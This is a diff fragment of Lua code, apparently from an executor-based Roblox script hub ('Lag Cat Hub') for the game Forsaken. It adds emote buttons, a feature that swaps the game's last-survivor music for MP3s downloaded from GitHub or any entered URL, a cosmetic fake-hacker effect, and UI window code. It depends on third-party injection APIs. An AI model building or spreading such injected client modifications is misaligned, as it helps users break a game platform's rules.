-    UDim2.new(0, 80, 0, 200),
-    UDim2.new(0, 140, 0, 200),
-    UDim2.new(0, 200, 0, 200),
-    UDim2.new(0, 260, 0, 200),
-}
-
--- 🌟 Drag Module
-local function makeDraggable(frame)
-    local dragging, dragStart, startPos
-
-    frame.InputBegan:Connect(function(input)
-        if not FramesLocked and (input.UserInputType == Enum.UserInputType.MouseButton1 
-            or input.UserInputType == Enum.UserInputType.Touch) then
-            dragging = true
-            dragStart = input.Position
-            startPos = frame.Position
-
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then
-                    dragging = false
-                end
-            end)
-        end
-    end)
-
-    UserInputService.InputChanged:Connect(function(input)
-        if not FramesLocked and dragging and 
-            (input.UserInputType == Enum.UserInputType.MouseMovement 
-            or input.UserInputType == Enum.UserInputType.Touch) then
-            local delta = input.Position - dragStart
-            frame.Position = UDim2.new(
-                startPos.X.Scale,
-                startPos.X.Offset + delta.X,
-                startPos.Y.Scale,
-                startPos.Y.Offset + delta.Y
-            )
-        end
-    end)
-end
-
--- 🔹 GUI container
-screenGui = Instance.new("ScreenGui")
-screenGui.Name = "CircleButtonsGUI"
-screenGui.ResetOnSpawn = false
-screenGui.IgnoreGuiInset = true
-screenGui.Enabled = false
-screenGui.Parent = playerGui
-
--- 🔹 Hàm tạo frame + button
-local function createFrameWithButton(data, pos)
-    local frame = Instance.new("Frame")
-    frame.Name = data.Name .. "_Frame"
-    frame.Size = UDim2.new(0, BUTTON_SIZE, 0, BUTTON_SIZE)
-    frame.Position = pos
-    frame.BackgroundTransparency = 1
-    frame.ZIndex = 1
-    frame.Parent = screenGui
-    frame.Active = true
-
-    -- bo tròn frame
-    local frameCorner = Instance.new("UICorner")
-    frameCorner.CornerRadius = UDim.new(1, 0)
-    frameCorner.Parent = frame
-
-    local btn = Instance.new("ImageButton")
-    btn.Name = data.Name
-    btn.Size = UDim2.new(1, 0, 1, 0)
-    btn.BackgroundTransparency = 1
-    btn.Image = "rbxassetid://" .. data.ImageId
-    btn.ZIndex = 2
-    btn.Parent = frame
-    btn.ScaleType = Enum.ScaleType.Fit -- giữ tỉ lệ ảnh
-
-    -- bo tròn nút
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(1, 0)
-    corner.Parent = btn
-
-    -- click chạy animation/nhạc
-    btn.MouseButton1Click:Connect(function()
-        if FramesLocked then
-            local char = player.Character or player.CharacterAdded:Wait()
-            local humanoid = char:FindFirstChildOfClass("Humanoid")
-            if not humanoid then return end
-
-            local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)
-            local anim = Instance.new("Animation")
-            anim.AnimationId = "rbxassetid://" .. data.AnimationId
-            local track = animator:LoadAnimation(anim)
-            track:Play()
-
-            if data.PlayMusic and data.MusicId then
-                local sound = Instance.new("Sound")
-                sound.SoundId = "rbxassetid://" .. data.MusicId
-                sound.Volume = 1
-                sound.Parent = char:FindFirstChild("Head") or playerGui
-                sound:Play()
-                sound.Ended:Connect(function() sound:Destroy() end)
-            end
-        end
-    end)
-
-    makeDraggable(frame)
-
-    btn.Visible = FramesLocked
-    frame.BackgroundTransparency = FramesLocked and 1 or 0.3
-
-    table.insert(createdFrames, frame)
-end
-
--- tạo nút
-for i, d in ipairs(buttonsData) do
-    createFrameWithButton(d, startPositions[i])
-end
-
--- 🌟 Tích hợp Toggle + Input
-Tabs.Custom:AddToggle("SukunaSkill", {
-    Title = "Sukuna Skill",
-    Default = false
-}):OnChanged(function(state)
-    screenGui.Enabled = state
-end)
-
-Tabs.Custom:AddToggle("SukunaLockButton", {
-    Title = "Lock Buttons",
-    Default = true
-}):OnChanged(function(state)
-    FramesLocked = state
-    for _, frame in ipairs(createdFrames) do
-        local btn = frame:FindFirstChildOfClass("ImageButton")
-        if btn then
-            btn.Visible = FramesLocked
-        end
-        frame.BackgroundTransparency = FramesLocked and 1 or 0.3
-    end
-end)
-
-Tabs.Custom:AddInput("SkunaButtonSkill", {
-    Title = "Button Size",
-    Default = tostring(BUTTON_SIZE),
-    Placeholder = "Nhập số px",
-    Numeric = true,
-    Finished = true
-}):OnChanged(function(value)
-    local num = tonumber(value)
-    if num and num > 0 then
-        BUTTON_SIZE = num
-        for _, frame in ipairs(createdFrames) do
-            frame.Size = UDim2.new(0, BUTTON_SIZE, 0, BUTTON_SIZE)
-            local btn = frame:FindFirstChildOfClass("ImageButton")
-            if btn then
-                btn.Size = UDim2.new(1, 0, 1, 0)
-            end
-        end
-    end
-end)
-end
-
-
-
-do
--- LocalScript (StarterPlayerScripts)
-
-local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
-local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
-
--- ⚡ Config
-local BUTTON_SIZE = 48
-local FramesLocked = true
-local screenGui
-local createdFrames = {}
-
--- dữ liệu các nút
-local buttonsData = {
-    {Name = "Btn1", AnimationId = "72722244508749", PlayMusic = false, ImageId = "87293861183080"},
-    {Name = "Btn2", AnimationId = "96959123077498", PlayMusic = false, ImageId = "87293861183080"},
-}
-
--- vị trí ban đầu
-local startPositions = {
-    UDim2.new(0, 80, 0, 200),
-    UDim2.new(0, 140, 0, 200),
-}
-
--- 🌟 Drag Module
-local function makeDraggable(frame)
-    local dragging, dragStart, startPos
-
-    frame.InputBegan:Connect(function(input)
-        if not FramesLocked and (input.UserInputType == Enum.UserInputType.MouseButton1 
-            or input.UserInputType == Enum.UserInputType.Touch) then
-            dragging = true
-            dragStart = input.Position
-            startPos = frame.Position
-
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then
-                    dragging = false
-                end
-            end)
-        end
-    end)
-
-    UserInputService.InputChanged:Connect(function(input)
-        if not FramesLocked and dragging and 
-            (input.UserInputType == Enum.UserInputType.MouseMovement 
-            or input.UserInputType == Enum.UserInputType.Touch) then
-            local delta = input.Position - dragStart
-            frame.Position = UDim2.new(
-                startPos.X.Scale,
-                startPos.X.Offset + delta.X,
-                startPos.Y.Scale,
-                startPos.Y.Offset + delta.Y
-            )
-        end
-    end)
-end
-
--- 🔹 GUI container
-screenGui = Instance.new("ScreenGui")
-screenGui.Name = "CircleButtonsGUI"
-screenGui.ResetOnSpawn = false
-screenGui.IgnoreGuiInset = true
-screenGui.Enabled = false
-screenGui.Parent = playerGui
-
--- 🔹 Hàm tạo frame + button
-local function createFrameWithButton(data, pos)
-    local frame = Instance.new("Frame")
-    frame.Name = data.Name .. "_Frame"
-    frame.Size = UDim2.new(0, BUTTON_SIZE, 0, BUTTON_SIZE)
-    frame.Position = pos
-    frame.BackgroundTransparency = 1
-    frame.ZIndex = 1
-    frame.Parent = screenGui
-    frame.Active = true
-
-    -- bo tròn frame
-    local frameCorner = Instance.new("UICorner")
-    frameCorner.CornerRadius = UDim.new(1, 0)
-    frameCorner.Parent = frame
-
-    local btn = Instance.new("ImageButton")
-    btn.Name = data.Name
-    btn.Size = UDim2.new(1, 0, 1, 0)
-    btn.BackgroundTransparency = 1
-    btn.Image = "rbxassetid://" .. data.ImageId
-    btn.ZIndex = 2
-    btn.Parent = frame
-    btn.ScaleType = Enum.ScaleType.Fit -- giữ tỉ lệ ảnh
-
-    -- bo tròn nút
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(1, 0)
-    corner.Parent = btn
-
-    -- click chạy animation/nhạc
-    btn.MouseButton1Click:Connect(function()
-        if FramesLocked then
-            local char = player.Character or player.CharacterAdded:Wait()
-            local humanoid = char:FindFirstChildOfClass("Humanoid")
-            if not humanoid then return end
-
-            local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)
-            local anim = Instance.new("Animation")
-            anim.AnimationId = "rbxassetid://" .. data.AnimationId
-            local track = animator:LoadAnimation(anim)
-            track:Play()
-
-            if data.PlayMusic and data.MusicId then
-                local sound = Instance.new("Sound")
-                sound.SoundId = "rbxassetid://" .. data.MusicId
-                sound.Volume = 1
-                sound.Parent = char:FindFirstChild("Head") or playerGui
-                sound:Play()
-                sound.Ended:Connect(function() sound:Destroy() end)
-            end
-        end
-    end)
-
-    makeDraggable(frame)
-
-    btn.Visible = FramesLocked
-    frame.BackgroundTransparency = FramesLocked and 1 or 0.3
-
-    table.insert(createdFrames, frame)
-end
-
--- tạo nút
-for i, d in ipairs(buttonsData) do
-    createFrameWithButton(d, startPositions[i])
-end
-
--- 🌟 Tích hợp Toggle + Input
-Tabs.Custom:AddToggle("Guest1337Skill", {
-    Title = "Guest1337 Skill",
-    Default = false
-}):OnChanged(function(state)
-    screenGui.Enabled = state
-end)
-
-Tabs.Custom:AddToggle("Guest1337LockButton", {
-    Title = "Lock Buttons",
-    Default = true
-}):OnChanged(function(state)
-    FramesLocked = state
-    for _, frame in ipairs(createdFrames) do
-        local btn = frame:FindFirstChildOfClass("ImageButton")
-        if btn then
-            btn.Visible = FramesLocked
-        end
-        frame.BackgroundTransparency = FramesLocked and 1 or 0.3
-    end
-end)
-
-Tabs.Custom:AddInput("Quest1337SkillSize", {
-    Title = "Button Size",
-    Default = tostring(BUTTON_SIZE),
-    Placeholder = "Nhập số px",
-    Numeric = true,
-    Finished = true
-}):OnChanged(function(value)
-    local num = tonumber(value)
-    if num and num > 0 then
-        BUTTON_SIZE = num
-        for _, frame in ipairs(createdFrames) do
-            frame.Size = UDim2.new(0, BUTTON_SIZE, 0, BUTTON_SIZE)
-            local btn = frame:FindFirstChildOfClass("ImageButton")
-            if btn then
-                btn.Size = UDim2.new(1, 0, 1, 0)
-            end
-        end
-    end
-end)
-end
-
-
-
--- 🧠 Services
-getgenv().SoundService = game:GetService("SoundService")
-getgenv().RunService = game:GetService("RunService")
-
--- 📁 Ensure folders exist
-local folderPath = "LagCatHub/Assets"
-if not isfolder("LagCatHub") then makefolder("LagCatHub") end
-if not isfolder(folderPath) then makefolder(folderPath) end
-
--- 🎵 Track list (FULL)
-getgenv().tracks = {
-    ["None"] = "",
-    ["----------- UST -----------"] = nil,
-    ["A BRAVE SOUL (MS 4 Killer VS MS 4 Survivor)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/A%20BRAVE%20SOUL%20(MS%204%20Killer%20VS%20MS%204%20Survivor).mp3",
-    ["BEGGED (MS 4 Coolkidd vs MS 4 007n7)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/BEGGED%20(MS%204%20Coolkidd%20vs%20MS%204%20007n7).mp3",
-    ["DOOMSPIRE (HairyTwinkle VS Pedro.EXE)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/DOOMSPIRE%20-%20(HairyTwinkle%20VS%20Pedro.EXE).mp3",
-    ["ECLIPSE (xX4ce0fSpadesXx vs dragondudes3)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/ECLIPSE%20(xX4ce0fSpadesXx%20vs%20dragondudes3).mp3",
-    ["ERROR 264 (Noob Cosplay VS Yourself)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/ERROR%20264%20-%20(Noob%20Cosplay%20VS%20Yourself).mp3",
-    ["GODS SECOND COMING (NOLI VS. 007n7)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/GODS%20SECOND%20COMING%20(NOLI%20VS.%20007n7).mp3",
-    ["Entreat (Bluudude Vs 118o8)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Entreat%20(Bluudude%20Vs%20118o8).mp3",
-    ["Implore (Comic vs Savior)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Implore%20(Comic%20vs%20Savior)%20-%20YouTube.mp3",
-    ["Leftovers (Remix Vanity Jason Vs All)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Leftovers%20(Remix%20Vanity%20Jason%20Vs%20All).mp3",
-    ["ORDER UP (Elliot VS c00lkidd)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/ORDER%20UP%20-%20(Elliot%20VS%20c00lkidd).mp3",
-    ["PARADOX (Guest 666 Vs Guest 1337)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/PARADOX%20(Guest%20666%20Vs%20Guest%201337).mp3",
-    ["TRUE BEAUTY (PRETTYPRINCESS vs 226w6)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/TRUE%20BEAUTY%20(PRETTYPRINCESS%20vs%20226w6).mp3",
-    ["Fall of a Hero (SLASHER vs GUEST 1337)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/%5BSLASHER%20vs%20GUEST%201337%20-%20LAST%20MAN%20STANDING%5D%20Fall%20of%20a%20Hero%20-%20Forsaken%20UST.mp3",
-    ["21ST CENTURY HUMOR (MLG Chance vs Hood Irony Whistle Occurrence)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/21ST%20CENTURY%20HUMOR%20-%20Last%20Man%20Standing%20(MLG%20Chance%20vs%20Hood%20Irony%20Whistle%20Occurrence)%20%20Forsaken%20UST.mp3",
-    ["SHATTERED GRACE (GR1MX 1x1x1x1 vs. ANGEL SHEDLETSKY)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/SHATTERED%20GRACE%20%5BGR1MX%201x1x1x1%20vs.%20ANGEL%20SHEDLETSKY%20LAST%20MAN%20STANDING%5D%20(Roblox%20Forsaken%20UST).mp3",
-    ["----------- Scrapped LMS -----------"] = nil,
-    ["THE DARKNESS IN YOUR HEART (Old 1x4 Vs Shedletsky)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/THE%20DARKNESS%20IN%20YOUR%20HEART%20(Old%201x4%20Vs%20Shedletsky).mp3",
-    ["MEET YOUR MAKING (c00lkidd ~ 1x4 Vs 007n7 ~ Shedletsky)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/MEET%20YOUR%20MAKING%20(c00lkidd%20~%201x4%20Vs%20007n7%20~%20Shedletsky).mp3",
-    ["A Creation Of Sorrow (Hacklord vs The Heartbroken)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/A%20Creation%20Of%20Sorrow%20(Hacklord%20vs%20The%20Heartbroken).mp3",
-    ["Debth (Natrasha Vs Mafioso)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Debth%20(Natrasha%20Vs%20Mafioso).mp3",
-    ["ETERNAL HOPE, ETERNAL FIGHT (Old LMS)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/ETERNAL%20HOPE,%20ETERNAL%20FIGHT%20(Old%20LMS).mp3",
-    ["Receading Lifespan (Barber Jason Vs Bald Two Time)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Receading%20Lifespan%20(Barber%20Jason%20Vs%20Bald%20Two%20Time).mp3",
-    ["VIP Jason LMS (VIP Jason Vs All)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/VIP%20Jason%20LMS%20(VIP%20Jason%20Vs%20All).mp3",
-    ["Jason Hate This Song"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/California%20Gurls%20%20Audio%20Edit%20-%20Neonick.mp3",
-    ["----------- Official LMS -----------"] = nil,
-    ["A GRAVE SOUL (NOW, RUN) [All Killers Vs All Survivors]"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/A%20GRAVE%20SOUL%20(NOW,%20RUN)%20%5BAll%20Killers%20Vs%20All%20Survivors%5D.mp3",
-    ["Plead (c00lkidd Vs 007n7)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Plead%20(c00lkidd%20Vs%20007n7).mp3",
-    ["SMILE (Cupcakes Vs All)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/SMILE%20(Cupcakes%20Vs%20All)%20.mp3",
-    ["Vanity (Vanity Jason Vs All)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Vanity%20(Vanity%20Jason%20Vs%20All).mp3",
-    ["Obsession (Gasharpoon Vs All)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Obsession%20(Gasharpoon%20Vs%20All).MP3",
-    ["Burnout (Diva Vs Ghoul)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Burnout%20(Diva%20Vs%20Ghoul).mp3",
-    ["Close To Me (Annihilation Vs Friend)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Close%20To%20Me%20(Annihilation%20Vs%20Friend).mp3",
-    ["Creation Of Hatred (1X4 Vs Shedletsky)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Creation%20Of%20Hatred%20(1X4%20Vs%20Shedletsky).mp3",
-    ["Through Patches of Violet (Hacklord vs The Heartbroken)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Through%20Patches%20of%20Violet%20(Hacklord%20vs%20The%20Heartbroken).mp3"
-}
-
--- 🔽 Dropdown options
-local options = {}
-for k, _ in pairs(getgenv().tracks) do
-    table.insert(options, k)
-end
-
--- 🌐 Globals
-getgenv().selectedSong = "None"
-getgenv().customSongUrl = nil
-getgenv().originalSongId = nil
-getgenv().isPlaying = false
-getgenv().isToggleOn = false
-
--- 💾 Download song (only one at a time)
-local function downloadTrack(name, url)
-    if not url or url == "" then return nil end
-    local path = folderPath .. "/" .. name:gsub("[^%w]", "_") .. ".mp3"
-    if not isfile(path) then
-        local req = http_request or syn.request or request
-        local res = req({Url = url, Method = "GET"})
-        local data = res.Body or res.BodyRaw
-        if data and #data > 0 then writefile(path, data) end
-    end
-    return path
-end
-
--- 🔍 Find LastSurvivor
-local function getLastSurvivor()
-    local t = workspace:FindFirstChild("Themes")
-    if t then return t:FindFirstChild("LastSurvivor") end
-    return nil
-end
-
--- ▶️ Set & play track
-local function setLastSurvivorSong(songName)
-    local ls = getLastSurvivor()
-    if not ls then return end
-    local url = getgenv().tracks[songName]
-    if not url or url == "" then return end
-    local path = downloadTrack(songName, url)
-    if not path then return end
-    local sound = getcustomasset(path)
-    if not getgenv().originalSongId then
-        getgenv().originalSongId = ls.SoundId
-    end
-    ls.SoundId = sound
-    ls:Play()
-    getgenv().isPlaying = true
-end
-
--- 🎛️ GUI Section
-Tabs.Custom:AddSection("Last Man Standing")
-
-Tabs.Custom:AddToggle("LMSReplacerSong", {
-    Title = "LMS Replacer Song",
-    Default = false,
-    Callback = function(Value)
-        getgenv().isToggleOn = Value
-        local ls = getLastSurvivor()
-        if not Value then
-            if ls and getgenv().originalSongId then
-                ls.SoundId = getgenv().originalSongId
-                ls:Play()
-            end
-            getgenv().isPlaying = false
-            getgenv().originalSongId = nil
-        else
-            if getgenv().selectedSong ~= "None" then
-                setLastSurvivorSong(getgenv().selectedSong)
-            elseif getgenv().customSongUrl then
-                local path = downloadTrack("Custom_LMS_Song", getgenv().customSongUrl)
-                if path then
-                    local sound = getcustomasset(path)
-                    if ls then
-                        getgenv().originalSongId = ls.SoundId
-                        ls.SoundId = sound
-                        ls:Play()
-                    end
-                end
-            end
-        end
-    end
-})
-
-local dropdown = Tabs.Custom:AddDropdown("CustomLMSSong", {
-    Title = "Seclect LMS Song",
-    Values = options,
-    Multi = false,
-    Default = "None",
-    Callback = function(Value)
-        getgenv().selectedSong = Value
-        -- ❌ Gỡ bỏ dòng gây lỗi
-        -- dropdown:SetValue(Value)
-    end
-})
-
-Tabs.Custom:AddInput("CustomLMSSongURL", {
-    Title = "Custom LMS",
-    Default = "",
-    Placeholder = "Enter raw MP3 URL",
-    Callback = function(input)
-        if input and input ~= "" then
-            getgenv().customSongUrl = input
-            if getgenv().isToggleOn then
-                local ls = getLastSurvivor()
-                if ls then
-                    local path = downloadTrack("Custom_LMS_Song", input)
-                    local sound = getcustomasset(path)
-                    if not getgenv().originalSongId then
-                        getgenv().originalSongId = ls.SoundId
-                    end
-                    ls.SoundId = sound
-                    ls:Play()
-                    getgenv().isPlaying = true
-                end
-            end
-        end
-    end
-})
-
--- ♻️ Maintain playback
-RunService.Heartbeat:Connect(function()
-    local ls = getLastSurvivor()
-    if getgenv().isToggleOn and ls then
-        -- chỉ phát lại nếu chưa phát hoặc đã dừng
-        if not ls.IsPlaying then
-            setLastSurvivorSong(getgenv().selectedSong)
-        end
-    elseif not getgenv().isToggleOn and ls and getgenv().originalSongId and ls.SoundId ~= getgenv().originalSongId then
-        -- khi tắt toggle, khôi phục nhạc gốc
-        ls.SoundId = getgenv().originalSongId
-        ls:Play()
-        getgenv().isPlaying = false
-    end
-end)
-
-
-
-Tabs.Custom:AddSection("Victim")
-
--- HackerVibe_Toggle.lua
--- Hiệu ứng hacker thật 3D, có nút bật/tắt (Fake H4CK3R)
--- Bảo toàn sau khi chết, đổi character, không rung giật
--- Hiệu ứng hacker 3D + animation tự bật/tắt
-
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local player = Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-
--- ⚙️ CONFIG
-local outlineColor = Color3.fromRGB(0, 255, 255)
-local binarySpawnInterval = 0.12
-local binaryLifetime = 1.8
-local binaryRiseDistance = 5
-local binaryMinScale = 0.6
-local binaryMaxScale = 1.1
-local maxSimultaneous = 40
-local spawnRadius = 3
-local animationId = "rbxassetid://86559211184601" -- 🧠 Animation Hacker
-
-math.randomseed(tick() + player.UserId)
-
--- === Biến ===
-local active = 0
-local running = false
-local folderName = "HackerFX3D"
-local folder = nil
-local animTrack = nil
-
--- === Danh sách part để spawn chữ ===
-local partNames = {
-	"Head","HumanoidRootPart",
-	"UpperTorso","LowerTorso","Torso",
-	"LeftUpperArm","RightUpperArm","LeftLowerArm","RightLowerArm",
-	"LeftUpperLeg","RightUpperLeg","LeftLowerLeg","RightLowerLeg",
-	"LeftHand","RightHand","LeftFoot","RightFoot"
-}
-
-local function getParts()
-	character = player.Character or player.CharacterAdded:Wait()
-	local list = {}
-	for _, name in ipairs(partNames) do
-		local part = character:FindFirstChild(name)
-		if part and part:IsA("BasePart") then
-			table.insert(list, part)
-		end
-	end
-	return list
-end
-
--- === Highlight Hacker ===
-local function createHighlight()
-	local old = character:FindFirstChild("HackerHighlight")
-	if old then old:Destroy() end
-	local h = Instance.new("Highlight")
-	h.Name = "HackerHighlight"
-	h.Adornee = character
-	h.OutlineColor = outlineColor
-	h.FillTransparency = 1
-	h.OutlineTransparency = 0
-	h.Parent = character
-end
-
--- === Folder hiệu ứng ===
-local function ensureFolder()
-	folder = player:WaitForChild("PlayerGui"):FindFirstChild(folderName)
-	if not folder then
-		folder = Instance.new("Folder")
-		folder.Name = folderName
-		folder.Parent = player:WaitForChild("PlayerGui")
-	end
-	return folder
-end
-
--- === Hiệu ứng số bay ===
-local function spawnBinary()
-	if not running then return end
-	if active >= maxSimultaneous then return end
-
-	local parts = getParts()
-	if #parts == 0 then return end
-	local origin = parts[math.random(1, #parts)]
-	if not origin then return end
-
-	active += 1
-	local s = ""
-	for i = 1, math.random(1, 3) do
-		s ..= tostring(math.random(0, 1))
-	end
-
-	local attach = Instance.new("Part")
-	attach.Anchored = false
-	attach.CanCollide = false
-	attach.Transparency = 1
-	attach.Size = Vector3.new(0.2, 0.2, 0.2)
-	attach.Parent = ensureFolder()
-
-	local weld = Instance.new("WeldConstraint")
-	weld.Part0 = attach
-	weld.Part1 = origin
-	weld.Parent = attach
-
-	local xOff = (math.random() - 0.5) * spawnRadius
-	local yOff = (math.random() - 0.5) * spawnRadius
-	local zOff = (math.random() - 0.5) * spawnRadius
-	attach.CFrame = origin.CFrame * CFrame.new(xOff, yOff, zOff)
-
-	local bb = Instance.new("BillboardGui")
-	bb.Size = UDim2.new(0, 80, 0, 30)
-	bb.AlwaysOnTop = true
-	bb.Adornee = attach
-	bb.Parent = folder
-
-	local txt = Instance.new("TextLabel")
-	txt.BackgroundTransparency = 1
-	txt.BorderSizePixel = 0
-	txt.Size = UDim2.fromScale(1, 1)
-	txt.Font = Enum.Font.Code
-	txt.Text = s
-	txt.TextColor3 = Color3.fromRGB(0, 255, 200)
-	txt.TextScaled = true
-	txt.TextTransparency = 0
-	txt.Parent = bb
-	txt.TextSize = 20 * (math.random() * (binaryMaxScale - binaryMinScale) + binaryMinScale)
-
-	local goal = attach.Position + Vector3.new(0, binaryRiseDistance, 0)
-	local moveTween = TweenService:Create(attach, TweenInfo.new(binaryLifetime, Enum.EasingStyle.Linear), {Position = goal})
-	local fadeTween = TweenService:Create(txt, TweenInfo.new(binaryLifetime, Enum.EasingStyle.Linear), {TextTransparency = 1})
-	moveTween:Play()
-	fadeTween:Play()
-
-	task.delay(binaryLifetime + 0.05, function()
-		pcall(function()
-			bb:Destroy()
-			attach:Destroy()
 		end)
-		active = math.max(0, active - 1)
-	end)
+
+		btnHide.InputChanged:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+				dragInput = input
+			end
+		end)
+
+		RunService.RenderStepped:Connect(function()
+			if holdStarted > 0 and tick() - holdStarted >= holdTime and not dragging then
+				dragging = true
+			end
+			if dragging and dragInput then
+				update(dragInput)
+			end
+		end)
+
+		btnHide.MouseButton1Click:Connect(function()
+			if not dragging then
+				ToggleZoomState()
+				Window:Minimize()
+				
+				if Config.ToggleButtonIconChange then
+					if Window.Minimized then
+						imgHide.Image = Config.ToggleButtonIconOpen or "rbxassetid://10734896384"
+					else
+						imgHide.Image = Config.ToggleButtonIcon or "rbxassetid://10734897102"
+					end
+				end
+			end
+		end)
+
+		Library.ToggleButton = {
+			Button = btnHide,
+			ScreenGui = HideGui,
+			Image = imgHide
+		}
+	end
+
+	Library.MinimizeKey = Config.MinimizeKey or Enum.KeyCode.LeftControl
+
+    end
+
+	if Config.SaveManager then
+		SaveManager:SetFolder("Lag Cat Hub/Forsaken/" .. game.Players.LocalPlayer.Name)
+		SaveManager:SetLibrary(Library)
+		
+		task.spawn(function()
+			task.wait(1)
+			local PlayerName = game.Players.LocalPlayer.Name
+			local configPath = SaveManager.Folder .. "/" .. PlayerName .. ".json"
+			if isfile(configPath) then
+				SaveManager:Load(PlayerName)
+			end
+		end)
+
+		game:GetService("Players").LocalPlayer.OnTeleport:Connect(function()
+			SaveManager:Save(game.Players.LocalPlayer.Name)
+		end)
+	end
+
+
+	Library.MinimizeKey = Config.MinimizeKey or Enum.KeyCode.LeftControl
+	Library.UseAcrylic = Config.Acrylic or false
+	Library.Acrylic = Config.Acrylic or false
+	Library.Theme = Config.Theme or "Dark"
+
+	if Config.Acrylic then
+		Acrylic.init()
+	end
+
+	local Icon = Config.Icon
+	if not fischbypass then 
+		if Library:GetIcon(Icon) then
+			Icon = Library:GetIcon(Icon)
+		end
+
+		if Icon == "" or Icon == nil then
+			Icon = nil
+		end
+	end
+
+	local Window = Components.Window({
+		Parent = GUI,
+		Size = Config.Size,
+		Title = Config.Title,
+		Icon = Icon,
+		SubTitle = Config.SubTitle,
+		TabWidth = Config.TabWidth,
+		Search = Config.Search,
+		UserInfoTitle = Config.UserInfoTitle,
+		UserInfo = Config.UserInfo,
+		UserInfoTop = Config.UserInfoTop,
+		UserInfoSubtitle = Config.UserInfoSubtitle,
+		UserInfoSubtitleColor = Config.UserInfoSubtitleColor,
+	})
+
+	Library.Window = Window
+	table.insert(Library.Windows, Window)
+	InterfaceManager:SetTheme(Config.Theme)
+	Library:SetTheme(Config.Theme)
+
+	return Window
 end
 
--- === Loop spawn chữ ===
-task.spawn(function()
-	while true do
-		if running then
-			spawnBinary()
-		end
-		task.wait(binarySpawnInterval)
-	end
-end)
-
--- === Khi respawn / đổi nhân vật ===
-player.CharacterAdded:Connect(function(char)
-	character = char
-	task.wait(0.25)
-	if running then
-		createHighlight()
-
-		-- 🔄 Phát lại animation nếu đang bật
-		local hum = character:FindFirstChildOfClass("Humanoid")
-		if hum then
-			local anim = Instance.new("Animation")
-			anim.AnimationId = animationId
-			animTrack = hum:LoadAnimation(anim)
-			animTrack:Play()
-			animTrack.Looped = true
-		end
-	end
-end)
-
--- === HÀM CHÍNH BẬT / TẮT ===
-local function ToggleFakeHacker(state)
-	running = state
-
-	local highlight = character:FindFirstChild("HackerHighlight")
-	if not highlight and state then
-		createHighlight()
+function Library:CreateMinimizer(Config)
+	Config = Config or {}
+	if self.Minimizer and self.Minimizer.Parent then
+		return self.Minimizer
 	end
 
-	if highlight then
-		highlight.OutlineTransparency = state and 0 or 1
+	local parentGui = Library.GUI or GUI
+	if parentGui then parentGui.DisplayOrder = 1000 end
+	local isMobile = Mobile and true or false
+
+	local iconAsset = "rbxassetid://10734897102"
+	if type(Config.Icon) == "string" and Config.Icon ~= "" then
+		pcall(function()
+			local resolved = Library:GetIcon(Config.Icon)
+			if resolved then
+				iconAsset = resolved
+			elseif string.match(Config.Icon, "^rbxassetid://%d+$") then
+				iconAsset = Config.Icon
+			end
+		end)
 	end
 
-	if state then
-		ensureFolder().Parent = player:WaitForChild("PlayerGui")
+	local useAcrylic = (Config.Acrylic == true)
 
-		-- 🎬 Bắt đầu animation
-		local hum = character:FindFirstChildOfClass("Humanoid")
-		if hum then
-			local anim = Instance.new("Animation")
-			anim.AnimationId = animationId
-			animTrack = hum:LoadAnimation(anim)
-			animTrack.Looped = true
-			animTrack:Play()
-		end
+	local cornerRadius = tonumber(Config.Corner)
+	local backgroundTransparency = (typeof(Config.Transparency) == "number") and math.clamp(Config.Transparency, 0, 1) or 0
+	local draggableWhole = (Config.Draggable == true)
+
+	local holder
+	local function createButton(isDesktop)
+		return New("TextButton", {
+			Name = "MinimizeButton",
+			Size = UDim2.new(1, 0, 1, 0),
+			BorderSizePixel = 0,
